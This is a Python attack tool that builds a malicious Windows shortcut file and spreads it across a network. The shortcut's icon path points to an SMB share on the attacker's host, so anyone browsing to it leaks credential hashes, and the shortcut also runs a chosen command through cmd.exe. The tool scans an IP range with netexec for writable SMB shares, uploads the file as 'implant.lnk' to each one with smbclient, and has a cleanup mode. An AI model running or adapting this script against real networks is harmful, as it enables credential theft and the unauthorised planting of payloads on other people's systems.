from __future__ import print_function
import argparse
import os
import random
import sys
from datetime import datetime
import subprocess

# Check if we're running on a Windows platform
is_windows = sys.platform.startswith('win')

# Import platform-specific libraries for LNK file creation
if is_windows:
    import win32com.client  # Windows-specific for creating LNK files using COM objects
else:
    try:
        import pylnk3 as pylnk  # pylnk3 for LNK creation on non-Windows platforms
    except ImportError:
        # If pylnk3 is not installed on non-Windows, exit the program
        print("You must install liblnk's python bindings for non-windows machines!")
        sys.exit(1)



banner = r"""

 ________                                                   __     
|        \                                                 |  \    
 \$$$$$$$$______        __  _______    ______    _______  _| $$_   
   | $$  |      \      |  \|       \  /      \  /       \|   $$ \  
   | $$   \$$$$$$\      \$$| $$$$$$$\|  $$$$$$\|  $$$$$$$ \$$$$$$  
   | $$  /      $$     |  \| $$  | $$| $$  | $$ \$$    \   | $$ __ 
   | $$ |  $$$$$$$     | $$| $$  | $$| $$__/ $$ _\$$$$$$\  | $$|  \
   | $$  \$$    $$     | $$| $$  | $$ \$$    $$|       $$   \$$  $$
    \$$   \$$$$$$$__   | $$ \$$   \$$  \$$$$$$  \$$$$$$$     \$$$$ 
                 |  \__/ $$                                        
                  \$$    $$                                        
                   \$$$$$$                                         

"""


# Function to parse command-line arguments
def parse_cmd_line_args():
    print("Parsing command-line arguments...")
    parser = argparse.ArgumentParser(description='Generate a LNK payload, upload, and clean up from SMB shares')
    parser.add_argument("--target-range", required=True, help="Target IP range for SMB scanning (e.g., 192.168.131.0/24)")
    parser.add_argument("--username", required=True, help="Username for SMB authentication")
    parser.add_argument("--password", required=True, help="Password for SMB authentication")
    parser.add_argument("--domain", help="Domain for SMB authentication (use only if domain auth is required)")
    parser.add_argument("--local-auth", action='store_true', help="Use --local-auth for SMB authentication")
    parser.add_argument("--host", required=True, help="Where to send data (attacker's IP)")
    parser.add_argument("--output", required=True, help="The name of the lnk file")
    parser.add_argument("--execute", nargs='+', default=[r'C:\Windows\explorer.exe .'], help="Command executed when the shortcut is clicked")
    parser.add_argument("--targets-file", default="/home/kali/targets.txt", help="Path to save found SMB targets")
    parser.add_argument("--cleanup", action='store_true', help="Remove the uploaded .lnk files from the SMB shares")
    args = parser.parse_args()
    print(f"Arguments received: {args}")
    return args

# Function to create the LNK file (shortcut)
def create_lnk_file(args):
    print(f"Creating LNK file with target command: {' '.join(args.execute)}")
    target = ' '.join(args.execute)

    icon = r'\\{host}\Share\{filename}.ico'.format(
        host=args.host,
        filename=random.randint(0, 50000)  # Random filename for the icon
    )

    if is_windows:
        print("Running on a Windows platform, creating LNK using COM object...")
        ws = win32com.client.Dispatch('wscript.shell')
        link = ws.CreateShortcut(args.output)
        link.Targetpath = r'C:\Windows\System32'
        link.Arguments = 'cmd.exe /c ' + target
        link.IconLocation = icon
        link.save()
        print(f"LNK file created at {args.output} with target: {target} and icon: {icon}")
    else:
        print("Running on a non-Windows platform, creating LNK using pylnk3...")
        lnk = pylnk.create(args.output)
        lnk.target = r'C:\Windows\System32\cmd.exe'
        lnk.arguments = '/c ' + target
        lnk.icon = icon
        lnk.save(args.output)
        print(f"LNK file created at {args.output} with target: {target} and icon: {icon}")

# Function to scan SMB shares
def scan_smb_shares(target_ip_range, username, password, domain, local_auth, output_file):
    print(f"Scanning SMB shares on IP range: {target_ip_range} with username: {username}")
    auth_flag = '--local-auth' if local_auth else f""
    command = f"netexec smb {target_ip_range} -u {username} -p '{password}' {auth_flag} --shares"  # Wrap password in single quotes
    print(f"Executing command: {command}")

    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    if result.returncode != 0:
        print(f"Error running netexec: {result.stderr}")
        return False

    targets = []
    for line in result.stdout.splitlines():
        if "WRITE" in line:
            fields = line.split()
            if len(fields) > 5:
                print(f"Found writable share: {fields[1]} on {fields[4]}")
                targets.append(f"{fields[1]} {fields[4]}")

    with open(output_file, 'w') as f:
        for target in targets:
            f.write(target + "\n")

    if not targets:
        print("No valid SMB shares found.")
        return False

    print(f"Targets saved to {output_file}. Total found: {len(targets)}")
    return True

# Function to upload the .lnk file to the found SMB shares
def upload_to_shares(targets_file, lnk_file, username, password, domain):
    print(f"Uploading {lnk_file} to SMB shares listed in {targets_file} using username: {username}")
    if not os.path.exists(targets_file):
        print(f"Targets file not found: {targets_file}")
        return False

    with open(targets_file, 'r') as f:
        for line in f:
            fields = line.split()
            if len(fields) < 2:
                print(f"Invalid target format: {line}")
                continue

            combined_target = f"{fields[0]}/{fields[1]}"
            destination = f"//{combined_target}/implant.lnk"
            print(f"Uploading LNK file to {destination}")

            if domain:
                smb_command = f"smbclient //{combined_target} -W {domain} -U {username}%'{password}' -c 'put {lnk_file} implant.lnk'"  # Wrap password in single quotes
            else:
                smb_command = f"smbclient //{combined_target} -U {username}%'{password}' -c 'put {lnk_file} implant.lnk'"  # Wrap password in single quotes

            print(f"Executing command: {smb_command}")
            upload_result = subprocess.run(smb_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if upload_result.returncode == 0:
                print(f"Successfully uploaded {lnk_file} to {destination}")
            else:
                print(f"Failed to upload to {destination}: {upload_result.stderr}")

    return True

# Function to clean up uploaded .lnk files from SMB shares
def cleanup_lnk_files(targets_file, username, password, domain):
    print(f"Cleaning up .lnk files from SMB shares listed in {targets_file} using username: {username}")
    if not os.path.exists(targets_file):
        print(f"Targets file not found: {targets_file}")
        return False

    with open(targets_file, 'r') as f:
        for line in f:
            fields = line.split()
            if len(fields) < 2:
                print(f"Invalid target format: {line}")
                continue

            combined_target = f"{fields[0]}/{fields[1]}"
            destination = f"//{combined_target}/implant.lnk"
            print(f"Removing LNK file from {destination}")

            if domain:
                smb_command = f"smbclient //{combined_target} -W {domain} -U {username}%'{password}' -c 'del implant.lnk'"  # Wrap password in single quotes
            else:
                smb_command = f"smbclient //{combined_target} -U {username}%'{password}' -c 'del implant.lnk'"  # Wrap password in single quotes

            print(f"Executing command: {smb_command}")
            delete_result = subprocess.run(smb_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            if delete_result.returncode == 0:
                print(f"Successfully deleted {destination}")
            else:
                print(f"Failed to delete {destination}: {delete_result.stderr}")

    return True

# Main function that ties all steps together
def main():
    print("Starting the script...")
    args = parse_cmd_line_args()  # Step 1: Parse command-line arguments
    print(banner)

    if not args.cleanup:
        print("LNK creation and SMB scanning workflow initiated...")
        create_lnk_file(args)  # Step 2: Create the .lnk file

        # Step 3: Scan for SMB shares and save to targets file
        if scan_smb_shares(args.target_range, args.username, args.password, args.domain, args.local_auth, args.targets_file):
            print(f"Uploading LNK file {args.output} to identified SMB shares...")
            upload_to_shares(args.targets_file, args.output, args.username, args.password, args.domain)  # Step 4: Upload LNK file
        else:
            print("No SMB shares available for upload.")
    else:
        print("Cleanup workflow initiated...")
        cleanup_lnk_files(args.targets_file, args.username, args.password, args.domain)  # Step 5: Cleanup LNK files

if __name__ == "__main__":
    main()
